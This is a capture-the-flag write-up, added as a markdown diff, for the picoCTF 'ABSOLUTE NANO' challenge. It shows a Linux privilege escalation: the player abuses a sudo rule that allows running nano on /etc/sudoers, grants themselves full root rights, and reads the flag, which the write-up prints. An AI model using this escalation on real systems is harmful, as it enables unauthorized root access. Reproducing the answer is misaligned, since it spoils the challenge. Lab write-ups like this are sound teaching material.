@@ -1,0 +1,87 @@
+---
+tags: [linux]
+---
+# ABSOLUTE NANO
+
+- **Description:** You have complete power with nano. Think you can get the flag?
+
+## 🔎 Solution
+After gaining access to the system, we can see that a file named `flag.txt` exists. 
+However, it cannot be read due to insufficient privileges (no `root` access):
+```
+ctf-player@challenge:~$ cat flag.txt 
+cat: flag.txt: Permission denied
+```
+
+Next, we enumerate the commands that the current user is allowed to execute with `sudo`. 
+It turns out that the user can run `/bin/nano` with `/etc/sudoers`:
+```
+ctf-player@challenge:~$ sudo -l
+Matching Defaults entries for ctf-player on challenge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+//highlight-start
+User ctf-player may run the following commands on challenge:
+    (ALL) NOPASSWD: /bin/nano /etc/sudoers
+//highlight-end
+```
+
+At this point, we might try using `nano` to open `flag.txt`. 
+However, the system denies this action:
+```
+ctf-player@challenge:~$ sudo nano flag.txt 
+[sudo] password for ctf-player: 
+Sorry, user ctf-player is not allowed to execute '/usr/bin/nano flag.txt' as root on challenge.
+```
+
+Another interesting file we are allowed to access is `/etc/sudoers`, which is a critical configuration file that controls sudo privileges on a Linux system. 
+Let's try opening it:
+```
+sudo nano /etc/sudoers
+```
+
+Access is granted, and the configuration looks like this:
+```
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+//highlight-next-line
+ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers
+```
+
+Since we can edit this file using `nano`, we can simply modify the privileges of `ctf-player` to grant full sudo access:
+```
+ctf-player ALL=(ALL:ALL) ALL
+```
+
+After saving the changes, we verify again with `sudo -l`. 
+The user now has full administrative privileges:
+```
+ctf-player@challenge:~$ sudo -l
+Matching Defaults entries for ctf-player on challenge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+//highlight-start
+User ctf-player may run the following commands on challenge:
+    (ALL : ALL) ALL
+//highlight-end
+```
+
+Finally, we can read the flag using elevated privileges:
+```
+ctf-player@challenge:~$ sudo cat flag.txt 
+picoCTF{n4n0_411_7h3_w4y_7fcf8f8d}
+```
+
+## 🚩 Flag
+> `picoCTF{n4n0_411_7h3_w4y_7fcf8f8d}`
+
